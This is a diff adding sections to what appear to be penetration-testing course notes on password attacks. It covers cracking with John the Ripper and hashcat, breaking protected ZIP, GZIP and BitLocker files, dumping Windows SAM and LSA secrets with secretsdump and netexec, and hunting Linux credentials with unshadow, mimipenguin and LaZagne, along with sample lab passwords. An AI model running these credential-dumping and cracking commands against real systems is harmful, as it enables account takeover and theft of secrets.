@@ -50,6 +50,43 @@ $ hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyo
 $ hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
 ```
 
+# Intro to John the Ripper
+
+## Single Crack Mode
+
+`Single crack mode` is a rule-based cracking technique that is most useful when targeting Linux credentials. It generates password candidates based on the victim's username, home directory name, and [GECOS](https://en.wikipedia.org/wiki/Gecos_field) values (full name, room number, phone number, etc.).
+
+Imagine we as attackers came across the file `passwd` with the following contents:
+
+```
+r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash
+```
+
+```bash
+$ john --single passwd
+```
+
+## Wordlist Mode
+
+`Wordlist mode` is used to crack passwords with a dictionary attack, meaning it attempts all passwords in a supplied wordlist against the password hash. The basic syntax for the command is as follows:
+
+```bash
+$ john --wordlist=<wordlist_file> <hash_file>
+```
+
+## Incremental Mode
+
+`Incremental mode` is a powerful, brute-force-style password cracking mode that generates candidate passwords based on a statistical model ([Markov chains](https://en.wikipedia.org/wiki/Markov_chain)). It is designed to test all character combinations defined by a specific character set, prioritizing more likely passwords based on training data.
+
+```bash
+$ john --incremental <hash_file>
+```
+
+## Identifying hash formats
+
+```bash
+$ hashid -j 193069ceb0461e1d40d216e32c79c704
+```
 
 # Custom Wordlists and Rules
 
@@ -150,6 +187,85 @@ $ john --wordlist=rockyou.txt pdf.hash
 $ john pdf.hash --show
 ```
 
+# Cracking Protected Archives
+
+## ZIP files
+
+```shell
+$ zip2john ZIP.zip > zip.hash
+$ cat zip.hash 
+
+ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip
+
+$ john --wordlist=rockyou.txt zip.hash
+```
+
+## OpenSSL encrypted GZIP files
+
+`openssl` can be used to encrypt files in the `GZIP` format. To determine the actual format of a file, we can use the `file` command, which provides detailed information about its contents.
+
+```bash
+$ file GZIP.gzip 
+
+GZIP.gzip: openssl enc'd data with salted password
+```
+
+The following one-liner may produce several GZIP-related error messages, which can be safely ignored. If the correct password list is used, as in this example, we will see another file successfully extracted from the archive.
+
+```bash
+for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
+
+gzip: stdin: not in gzip format
+tar: Child returned status 1
+tar: Error is not recoverable: exiting now
+
+gzip: stdin: not in gzip format
+tar: Child returned status 1
+tar: Error is not recoverable: exiting now
+<SNIP>
+```
+
+Once the `for` loop has finished, we can check the current directory for a newly extracted file.
+
+```bash
+ls
+
+customers.csv  GZIP.gzip  rockyou.txt
+```
+
+## BitLocker-encrypted drives
+
+```bash
+$ bitlocker2john -i Backup.vhd > backup.hashes
+$ grep "bitlocker\$0" backup.hashes > backup.hash
+$ cat backup.hash
+
+$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f
+```
+
+```bash
+hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt
+```
+
+## Mounting BitLocker-encrypted drives (windows)
+
+The easiest method for mounting a BitLocker-encrypted virtual drive on Windows is to double-click the `.vhd` file.
+
+## Mounting BitLocker-encrypted drives in Linux (or macOS)
+
+```bash
+$ sudo mkdir -p /media/bitlocker
+$ sudo mkdir -p /media/bitlockermount
+```
+
+We then use `losetup` to configure the VHD as [loop device](https://en.wikipedia.org/wiki/Loop_device), decrypt the drive using `dislocker`, and finally mount the decrypted volume:
+
+```bash
+$ sudo losetup -f -P Backup.vhd
+$ sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
+$ sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
+```
+
 
 # Spraying, Stuffing, and Defaults
 
@@ -201,6 +317,79 @@ $ creds search linksys
 
 Beyond applications, default credentials are also commonly associated with routers. One such list is available [here](https://www.softwaretestinghelp.com/default-router-username-and-password-list/). While it is less likely that router credentials remain unchanged (since these devices are critical to network security), oversights do occur.
 
+# Attacking SAM, SYSTEM, and SECURITY
+
+There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.
+
+| Registry Hive   | Description                                                                                                                                                       |
+| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `HKLM\SAM`      | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                                        |
+| `HKLM\SYSTEM`   | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                |
+| `HKLM\SECURITY` | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |
+
+## Using reg.exe to copy registry hives
+
+```powershell
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+
+The operation completed successfully.
+```
+
+## Dumping hashes with secretsdump
+
+```bash
+$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+```
+
+Here we see that `secretsdump` successfully dumped the `local` SAM hashes, along with data from `hklm\security`, including cached domain logon information and LSA secrets such as the machine and user keys for DPAPI.
+
+```bash
+$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+
+hashcat (v6.1.1) starting...
+
+<SNIP>
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+```
+
+## Remote dumping & LSA secrets considerations
+
+With access to credentials that have `local administrator privileges`, it is also possible to target LSA secrets over the network.
+
+This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.
+
+```bash
+$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+
+SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
+SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
+SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
+SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
+```
+
+```bash
+$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+
+SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
+SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
+SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
+```
+
 # Attacking LSASS
 
 Upon initial logon, LSASS will:
@@ -212,7 +401,7 @@ Upon initial logon, LSASS will:
 
 ## Dumping from Task Manager
 
-![[Pasted image 20260103101738.png]]
+![](images/Pasted%20image%2020260103101738.png)
 
 ## Dumping with Rundll32 & Comsvcs.dll
 
@@ -270,7 +459,7 @@ luid 124054
 # Creds Hunting in Windows
 ## Windows Search
 
-![[Pasted image 20260103132553.png]]
+![](images/Pasted%20image%2020260103132553.png)
 
 ## LaZagne
 
@@ -285,13 +474,211 @@ We can also take advantage of third-party tools like [LaZagne](https://github.c
 |sysadmin|Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP|
 |windows|Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more|
 |wifi|Dumps WiFi credentials|
-![[Pasted image 20260103132903.png]]
+![](images/Pasted%20image%2020260103132903.png)
 
 ## findstr
 
 ```powershell
 C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 ```
+
+# Linux Auth Process
+
+Once we have root access on a Linux machine, we can gather user password hashes and attempt to crack them using various methods to recover the plaintext passwords. To do this, we can use a tool called [unshadow](https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c), which is included with John the Ripper (JtR). It works by combining the `passwd` and `shadow` files into a single file suitable for cracking.
+
+```bash
+$ unshadow passwd shadow | grep -i sarah > sarah.txt
+
+$ hashcat -a 0 -m 1800 sarah.txt rockyou.txt
+```
+
+```bash
+$ unshadow passwd shadow | grep -i martin > martin.txt
+$ john --single martin.txt
+```
+
+# Creds Hunting in Linux
+
+## Searching for Config files
+
+```bash
+$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+
+File extension:  .conf
+/run/tmpfiles.d/static-nodes.conf
+/run/NetworkManager/resolv.conf
+/run/NetworkManager/no-stub-resolv.conf
+/run/NetworkManager/conf.d/10-globally-managed-devices.conf
+...SNIP...
+/etc/ltrace.conf
+/etc/rygel.conf
+/etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
+/etc/fprintd.conf
+```
+
+```bash
+$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+```
+
+## Searching for databases
+
+```bash
+$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+
+DB File extension:  .sql
+
+DB File extension:  .db
+/var/cache/dictionaries-common/ispell.db
+/var/cache/dictionaries-common/aspell.db
+/var/cache/dictionaries-common/wordlist.db
+/var/cache/dictionaries-common/hunspell.db
+/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
+/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
+/home/cry0l1t3/.cache/tracker/meta.db
+
+DB File extension:  .*db
+```
+
+## Searching for notes
+
+```bash
+$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
+```
+
+## Searching  for scripts
+
+```bash
+$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+
+File extension:  .py
+
+File extension:  .pyc
+
+File extension:  .pl
+
+File extension:  .go
+
+File extension:  .jar
+
+File extension:  .c
+
+File extension:  .sh
+/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
+/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
+/snap/core18/2128/etc/init.d/hwclock.sh
+```
+
+## Enumerating Cronjobs
+
+```bash
+$ cat /etc/crontab 
+
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+```
+
+```bash
+$ ls -la /etc/cron.*/
+
+/etc/cron.d/:
+total 28
+drwxr-xr-x 1 root root  106  3. Jan 20:27 .
+drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
+-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
+-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
+-rw-r--r-- 1 root root  607 25. Jan 2021  john
+-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
+-rw-r--r-- 1 root root  712 11. Mai 2020  php
+-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
+-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat
+
+/etc/cron.daily/:
+total 68
+drwxr-xr-x 1 root root  252  6. Jan 16:24 .
+drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
+<SNIP>
+```
+
+## Enumerating history files
+
+```bash
+$ tail -n5 /home/*/.bash*
+
+==> /home/cry0l1t3/.bash_history <==
+vim ~/testing.txt
+vim ~/testing.txt
+chmod 755 /tmp/api.py
+su
+/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK
+
+==> /home/cry0l1t3/.bashrc <==
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+```
+
+## Memory and Cache
+
+In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.
+
+```bash
+$ sudo python3 mimipenguin.py
+
+[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY
+```
+
+An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is `LaZagne`. This tool allows us to access far more resources and extract the credentials.
+
+```bash
+$ sudo python2.7 laZagne.py all
+
+|====================================================================|
+|                                                                    |
+|                        The LaZagne Project                         |
+|                                                                    |
+|                          ! BANG BANG !                             |
+|                                                                    |
+|====================================================================|
+
+------------------- Shadow passwords -----------------
+
+[+] Hash found !!!
+Login: systemd-coredump
+Hash: !!:18858::::::
+
+[+] Hash found !!!
+Login: sambauser
+Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::
+
+[+] Password found !!!
+Login: cry0l1t3
+Password: WLpAEXFa0SbqOHY
+
+
+[+] 3 passwords have been found.
+For more information launch it again with the -v option
+
+elapsed time = 3.50091600418
+```
+
 
 # Creds Hunting in Network Traffic
 
@@ -498,7 +885,7 @@ We can perform an RDP PtH attack to gain GUI access to the target system using t
 
 `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
 
-![[Pasted image 20260106090354.png]]
+![](images/Pasted%20image%2020260106090354.png)
 
 It can be done using the following command:
 
